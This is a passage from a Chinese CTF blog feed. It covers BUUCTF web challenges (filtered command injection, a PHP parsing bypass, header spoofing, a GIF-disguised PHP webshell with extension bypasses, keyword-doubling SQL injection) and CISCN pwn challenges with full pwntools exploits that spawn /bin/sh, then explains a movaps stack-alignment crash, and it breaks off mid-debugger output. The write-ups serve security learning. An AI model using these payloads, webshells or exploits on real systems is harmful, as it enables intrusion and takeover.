class="variable">$match</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> preg_match(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$match</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your symbol!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ /&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your space!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/bash/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your bash!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your flag!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$a</span> = shell_exec(<span class="string">&quot;ping -c 4 &quot;</span>.<span class="variable">$ip</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">  print_r(<span class="variable">$a</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到确实过滤了很多东西</p><h3 id="1-拼接"><a href="#1-拼接" class="headerlink" title="1)拼接"></a>1)拼接</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=1;a=g;cat$IFS$1fla$a.php;</span><br></pre></td></tr></table></figure><h3 id="2-base64"><a href="#2-base64" class="headerlink" title="2)base64"></a>2)base64</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br></pre></td></tr></table></figure><p>其中Y2F0IGZsYWcucGhw是cat flag.php的base64编码，之后用base64 -d命令解码</p><h3 id="3-内敛绕过-NB"><a href="#3-内敛绕过-NB" class="headerlink" title="3)内敛绕过(NB)"></a>3)内敛绕过(NB)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=111;cat$IFS$1`ls`</span><br></pre></td></tr></table></figure><p>就是将反引号内命令的输出作为输入执行。</p><h2 id="0xB-极客大挑战-2019-Knife"><a href="#0xB-极客大挑战-2019-Knife" class="headerlink" title="0xB.[极客大挑战 2019]Knife"></a>0xB.[极客大挑战 2019]Knife</h2><p>菜刀连一下就OK</p><h2 id="0xC-RoarCTF-2019-Easy-Calc"><a href="#0xC-RoarCTF-2019-Easy-Calc" class="headerlink" title="0xC.[RoarCTF 2019]Easy Calc"></a>0xC.[RoarCTF 2019]Easy Calc</h2><p>这题用到的知识点：<strong>PHP的字符串解析特性</strong></p><p><strong>可以先查看根目录下文件：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?%20num=1;var_dump(scandir(chr(47)))</span><br></pre></td></tr></table></figure><p><img src="/2021/04/17/BUU-WEB-0x1-0xF/image-20210415181858484.png" alt="image-20210415181858484"></p><p>为什么要在num前加空格？</p><p>​    假如waf不允许num变量传递字母，可以在num前加个空格，这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。</p><p>如果发现过滤，可以使用chr()转ascii之后拼接。</p><p><strong>列出flagg</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?%20num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><br></pre></td></tr></table></figure><p>之后得到flag</p><p><strong>PHP的字符串解析特性是什么？</strong></p><p>答： PHP需要将所有参数转换为有效的变量名，因此在<strong>解析查询字符串时</strong>，它会做两件事：</p><p>1.删除空白符 </p><p>2.将某些字符转换为下划线（包括空格）</p><p>[当waf不让你过的时候，php却可以让你过]</p><p>还有一种方法：</p><p><strong>HTTP走私攻击（HTTP数据接收不同步攻击）</strong></p><h2 id="0xD-极客大挑战-2019-Http"><a href="#0xD-极客大挑战-2019-Http" class="headerlink" title="0xD.[极客大挑战 2019]Http"></a>0xD.[极客大挑战 2019]Http</h2><p>找到Secret.php文件</p><p>说没有来自<a href="https://www.sycsecret.com网站,加/">https://www.Sycsecret.com网站，加</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer:https://www.Sycsecret.com</span><br></pre></td></tr></table></figure><p>又说不是某个浏览器i，该user-agent</p><p>说只能来自本地：X-Forwarded-For:127.0.0.1</p><p>之后得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Referer：来自哪个网站</span><br><span class="line">User-agent：浏览器</span><br><span class="line">x-forwarded-for：伪造IP</span><br></pre></td></tr></table></figure><h2 id="0xE-极客大挑战-2019-Upload"><a href="#0xE-极客大挑战-2019-Upload" class="headerlink" title="0xE.[极客大挑战 2019]Upload"></a>0xE.[极客大挑战 2019]Upload</h2><p>文件上传，</p><p>常用一句话：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a? &lt;script language=&quot;php&quot;&gt;eval($_REQUEST[shell])&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>绕过后缀：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php,php3,php4,php5,phtml,pht</span><br></pre></td></tr></table></figure><p>更改文件类型：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">image/jpeg</span><br></pre></td></tr></table></figure><p>得到flag</p><h2 id="0xF-极客大挑战-2019-BabySQL"><a href="#0xF-极客大挑战-2019-BabySQL" class="headerlink" title="0xF.[极客大挑战 2019]BabySQL"></a>0xF.[极客大挑战 2019]BabySQL</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">对or by 有过滤</span><br><span class="line">用union select试下</span><br><span class="line">check.php?username=admin&amp;password=111 %27 uniounionn selecselectt 1,2,3%23</span><br><span class="line"></span><br><span class="line">check.php?username=admin&amp;password=111 %27 uniounionn selecselectt 1,group_concat(schema_name),3 frofromm infoorrmation_schema.schemata %23</span><br><span class="line">可疑数据库：ctf</span><br><span class="line"></span><br><span class="line">check.php?username=admin&amp;password=111 %27 uniounionn selecselectt 1,group_concat(table_name),3 frofromm infoorrmation_schema.tables whewherere table_schema=&#x27;ctf&#x27; %23</span><br><span class="line">有Flag表</span><br><span class="line"></span><br><span class="line">check.php?username=admin&amp;password=111 %27 uniounionn selecselectt 1,group_concat(column_name),3 frofromm infoorrmation_schema.columns whewherere table_schema=&#x27;ctf&#x27; aandnd column_name=&#x27;Flag&#x27;%23</span><br><span class="line">有flag</span><br><span class="line"></span><br><span class="line">check.php?username=admin&amp;password=111 %27 uniounionn selecselectt 1,flag,3 frofromm ctf.Flag%23</span><br><span class="line">得到flag</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 id=&quot;0x1-HCTF-2018-WarmUp&quot;&gt;&lt;a href=&quot;#0x1-HCTF-2018-WarmUp&quot; class=&quot;headerlink&quot; title=&quot;0x1.[HCTF 2018]WarmUp&quot;&gt;&lt;/a&gt;0x1.[HCTF 20</summary>
      
    
    
    
    
    <category term="WEB" scheme="http://example.com/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>CISCN_PWN</title>
    <link href="http://example.com/2021/04/08/CISCN-PWN/"/>
    <id>http://example.com/2021/04/08/CISCN-PWN/</id>
    <published>2021-04-07T16:00:00.000Z</published>
    <updated>2021-06-02T02:14:48.816Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a>ciscn_2019_s_3</h2><p>　　32位与64位 系统调用的区别：</p><blockquote><p>　　1. 传参方式不同</p><p>　　2. 系统调用号 不同</p><p>　　3. 调用方式 不同</p></blockquote><p>　　32位：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">传参方式：首先将系统调用号 传入 eax，然后将参数 从左到右 依次存入 ebx，ecx，edx寄存器中，返回值存在eax寄存器</span><br><span class="line"></span><br><span class="line">调用号：sys_read 的调用号 为 3 sys_write 的调用号 为 4</span><br><span class="line"></span><br><span class="line">调用方式: 使用 int 80h 中断进行系统调用</span><br></pre></td></tr></table></figure><p>　　64位：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">传参方式：首先将系统调用号 传入 rax，然后将参数 从左到右 依次存入 rdi，rsi，rdx寄存器中，返回值存在rax寄存器</span><br><span class="line"></span><br><span class="line">调用号：sys_read 的调用号 为 0 sys_write 的调用号 为 1</span><br><span class="line"></span><br><span class="line">stub_execve 的调用号 为 59 stub_rt_sigreturn 的调用号 为 15</span><br><span class="line"></span><br><span class="line">调用方式: 使用 syscall 进行系统调用</span><br></pre></td></tr></table></figure><p>调用：$rax==59，$rdi==“/bin/sh”，$rsi==0，$rdx==0</p><p>首先往栈上写0x400，然后从栈上读0x30</p><p>经过调试发现输入后返回的是写入栈上的位置。</p><p><img src="/2021/04/08/CISCN-PWN/image-20210511160829045.png" alt="image-20210511160829045"></p><p>将0x00007ffe7d621e58减去0x00007ffe7d621d40得到0x118（固定）</p><p>所以经过recv的地址减去0x118就是写入/bin/sh的地址</p><p>有个gadgets函数：</p><p><img src="/2021/04/08/CISCN-PWN/image-20210511161319133.png" alt="image-20210511161319133"></p><p>其中的0x3B就是59，系统调用，</p><blockquote><p>hex(0x00007ffe7d621e58 - 0x7ffe7d621d40)<br>‘0x118’</p></blockquote><p><img src="/2021/04/08/CISCN-PWN/image-20210511162201775.png" alt="image-20210511162201775"></p><p>r12是将要执行的地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26613</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./ciscn_s_3&quot;)</span></span><br><span class="line">vulun_addr = <span class="number">0x4004ED</span></span><br><span class="line">mov_rax = <span class="number">0x4004E2</span></span><br><span class="line">pop_rbx_rbp_r12= <span class="number">0x40059a</span></span><br><span class="line">mov_call = <span class="number">0x400580</span></span><br><span class="line">sys_call = <span class="number">0x400517</span></span><br><span class="line">pop_rdi = <span class="number">0x04005a3</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;/bin/sh\x00&quot;</span>*<span class="number">2</span> + p64(vulun_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recv(<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">bin_sh_add = u64(io.recv(<span class="number">8</span>))-<span class="number">0x118</span></span><br><span class="line">payload = <span class="string">b&quot;/bin/sh\x00&quot;</span>*<span class="number">2</span> + p64(pop_rbx_rbp_r12)+p64(<span class="number">0</span>)*<span class="number">2</span>+ p64(bin_sh_add+<span class="number">0x50</span>) + p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line"></span><br><span class="line">payload +=  p64(mov_call)+p64(mov_rax) +p64(pop_rdi)+ p64(bin_sh_add) + p64(sys_call)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="ciscn-2019-n-3"><a href="#ciscn-2019-n-3" class="headerlink" title="ciscn_2019_n_3"></a>ciscn_2019_n_3</h2><p>new()中，分为两种type，一种是整形，一种是字符串，字符串的话将地址放在chunk中。</p><p>分配的0x10的有8byte写了两个函数的地址。（str_printf和str_free）</p><p>所以直接将free的地址改为system然后执行就OK。</p><p>这道题第一开始一直没太搞懂。</p><p><img src="/2021/04/08/CISCN-PWN/image-20210512205816626.png" alt="image-20210512205816626"></p><p>他delete了1和2之后，bin中有了两个，再下来new3 写入的时候，首先是malloc了1e0的那个位置，之后存放的地址是1a0那里，一直以为是1f0的位置。。。所以写入的sh+system的地址是1a0。</p><p>还有就是为什么sh的地址是1a0，可以这样查看，<img src="/2021/04/08/CISCN-PWN/image-20210512210029878.png" alt="image-20210512210029878"></p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./ciscn_2019_n_3&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;ciscn_2019_n_3&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">newnote</span>(<span class="params">idx,<span class="built_in">type</span>,value,length=<span class="number">0</span></span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;CNote &gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index &gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Type &gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">type</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == <span class="number">1</span>:</span><br><span class="line">        p.recvuntil(<span class="string">&quot;Value &gt; &quot;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(value))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">            p.recvuntil(<span class="string">&quot;Length &gt; &quot;</span>)</span><br><span class="line">            p.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">            p.recvuntil(<span class="string">&quot;Value &gt; &quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> length == <span class="number">8</span>:</span><br><span class="line">                p.send(value)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                p.sendline(value)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delnote</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;CNote &gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index &gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shownote</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;CNote &gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index &gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">newnote(<span class="number">0</span>,<span class="number">2</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>,<span class="number">0x2c</span>)</span><br><span class="line">newnote(<span class="number">1</span>,<span class="number">2</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x10</span>,<span class="number">0x2c</span>)</span><br><span class="line">newnote(<span class="number">2</span>,<span class="number">2</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x10</span>,<span class="number">0x2c</span>)</span><br><span class="line"></span><br><span class="line">delnote(<span class="number">1</span>)</span><br><span class="line">delnote(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">newnote(<span class="number">3</span>,<span class="number">2</span>,<span class="string">&#x27;sh\x00\x00&#x27;</span>+ p32(elf.plt[<span class="string">&#x27;system&#x27;</span>]),<span class="number">0xc</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">delnote(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 id=&quot;ciscn-2019-s-3&quot;&gt;&lt;a href=&quot;#ciscn-2019-s-3&quot; class=&quot;headerlink&quot; title=&quot;ciscn_2019_s_3&quot;&gt;&lt;/a&gt;ciscn_2019_s_3&lt;/h2&gt;&lt;p&gt;　　32位与64位</summary>
      
    
    
    
    
    <category term="PWN" scheme="http://example.com/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>在64位的glibc上payload调用system导致crash的问题</title>
    <link href="http://example.com/2021/04/08/64%E4%B8%BApayload%E8%B0%83%E7%94%A8system%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98/"/>
    <id>http://example.com/2021/04/08/64%E4%B8%BApayload%E8%B0%83%E7%94%A8system%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98/</id>
    <published>2021-04-07T16:00:00.000Z</published>
    <updated>2021-06-01T16:07:44.074Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="在64位的glibc上payload调用system导致crash的问题"><a href="#在64位的glibc上payload调用system导致crash的问题" class="headerlink" title="在64位的glibc上payload调用system导致crash的问题"></a>在64位的glibc上payload调用system导致crash的问题</h1><p>在一些64位的pwn题中，调用system后会导致程序crash掉</p><p>首先小讲下原因：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000040F93C                 mov     [rsp+198h+var_190], rax</span><br><span class="line">.text:000000000040F941                 movhps  xmm0, [rsp+198h+var_190]</span><br><span class="line">.text:000000000040F946                 movaps  [rsp+198h+var_158], xmm0</span><br><span class="line">.text:000000000040F94B                 call    sigaction</span><br></pre></td></tr></table></figure><p>是<code>movaps  [rsp+198h+var_158], xmm0</code>指令要求<code>rsp+198h+var_158</code>的值是对其16byte(0x10)，否则的话会直接出发中断从而导致crash。</p><blockquote><p>  Movaps：<br>  <code>movaps XMM,XMM/m128 movaps XMM/128,XMM</code><br>  把源存储器内容值送入目的寄存器,当有m128时,必须对齐内存16字节,也就是内存地址低4位为0.</p></blockquote><h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><p>示例程序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>断在：<code>movaps  [rsp+198h+var_158], xmm0</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; </span><br><span class="line">131in ../sysdeps/posix/system.c</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────</span><br><span class="line"> RAX  0x7ffff7b95e17 ◂— sub    eax, 0x622f0063 /* &#x27;-c&#x27; */</span><br><span class="line"> RBX  0x0</span><br><span class="line"> RCX  0x7ffff7b95e1f ◂— jae    0x7ffff7b95e89 /* &#x27;sh&#x27; */</span><br><span class="line"> RDX  0x0</span><br><span class="line"> RDI  0x2</span><br><span class="line"> RSI  0x7ffff7dcf6a0 (intr) ◂— 0x0</span><br><span class="line"> R8   0x7ffff7dcf600 (quit) ◂— 0x0</span><br><span class="line"> R9   0x7ffff7dced80 (initial) ◂— 0x0</span><br><span class="line"> R10  0x8</span><br><span class="line"> R11  0x346</span><br><span class="line"> R12  0x5555555546f4 ◂— 0x68732f6e69622f /* &#x27;/bin/sh&#x27; */</span><br><span class="line"> R13  0x7fffffffe080 ◂— 0x1</span><br><span class="line"> R14  0x0</span><br><span class="line"> R15  0x0</span><br><span class="line"> RBP  0x7fffffffde60 ◂— 0x0</span><br><span class="line"> RSP  0x7fffffffde00 ◂— 0x7fff00000002</span><br><span class="line">*RIP  0x7ffff7a3140b (do_system+1099) ◂— call   0x7ffff7a21230</span><br><span class="line">───────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────</span><br><span class="line">   0x7ffff7a313ed &lt;do_system+1069&gt;    mov    qword ptr [rsp + 0x58], 0</span><br><span class="line">   0x7ffff7a313f6 &lt;do_system+1078&gt;    movq   xmm0, qword ptr [rsp + 8]</span><br><span class="line">   0x7ffff7a313fc &lt;do_system+1084&gt;    mov    qword ptr [rsp + 8], rax</span><br><span class="line">   0x7ffff7a31401 &lt;do_system+1089&gt;    movhps xmm0, qword ptr [rsp + 8]</span><br><span class="line">   0x7ffff7a31406 &lt;do_system+1094&gt;    movaps xmmword ptr [rsp + 0x40], xmm0</span><br><span class="line"> ► 0x7ffff7a3140b &lt;do_system+1099&gt;    call   sigaction &lt;sigaction&gt;</span><br><span class="line">        sig: 0x2</span><br><span class="line">        act: 0x7ffff7dcf6a0 (intr) ◂— 0x0</span><br><span class="line">        oact: 0x0</span><br><span class="line"> </span><br><span class="line">   0x7ffff7a31410 &lt;do_system+1104&gt;    lea    rsi, [rip + 0x39e1e9] &lt;0x7ffff7dcf600&gt;</span><br><span class="line">   0x7ffff7a31417 &lt;do_system+1111&gt;    xor    edx, edx</span><br><span class="line">   0x7ffff7a31419 &lt;do_system+1113&gt;    mov    edi, 3</span><br><span class="line">   0x7ffff7a3141e &lt;do_system+1118&gt;    call   sigaction &lt;sigaction&gt;</span><br><span class="line"> </span><br><span class="line">   0x7ffff7a31423 &lt;do_system+1123&gt;    xor    edx, edx</span><br><span class="line">───────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────</span><br><span class="line">00:0000│ rsp  0x7fffffffde00 ◂— 0x7fff00000002</span><br><span class="line">01:0008│      0x7fffffffde08 —▸ 0x7ffff7b95e17 ◂— sub    eax, 0x622f0063 /* &#x27;-c&#x27; */</span><br><span class="line">02:0010│      0x7fffffffde10 —▸ 0x7fffffffdf10 ◂— 0x0</span><br><span class="line">03:0018│      0x7fffffffde18 ◂— 0x3</span><br><span class="line">04:0020│      0x7fffffffde20 —▸ 0x7ffff7a31470 (cancel_handler) ◂— push   rbx</span><br><span class="line">05:0028│      0x7fffffffde28 —▸ 0x7fffffffde1c ◂— 0xf7a3147000000000</span><br><span class="line">06:0030│      0x7fffffffde30 —▸ 0x7ffff7ffe738 —▸ 0x7ffff7ffe710 —▸ 0x7ffff7ffb000 ◂— jg     0x7ffff7ffb047</span><br><span class="line">07:0038│      0x7fffffffde38 ◂— 0x0</span><br><span class="line">─────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────</span><br><span class="line"> ► f 0     7ffff7a3140b do_system+1099</span><br><span class="line">   f 1     55555555465a main+16</span><br><span class="line">   f 2     7ffff7a03bf7 __libc_start_main+231</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后查看$rsp+0x40:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x $rsp+0x40</span><br><span class="line">$2 = 0x7fffffffde40</span><br></pre></td></tr></table></figure><p>可以看到是对齐的，也就是内存地址的低位为0。</p><p>下面对$rsp+1：<code>set $rsp=$rsp+1</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; set $rsp=$rsp+1</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────────────────────────────────[ 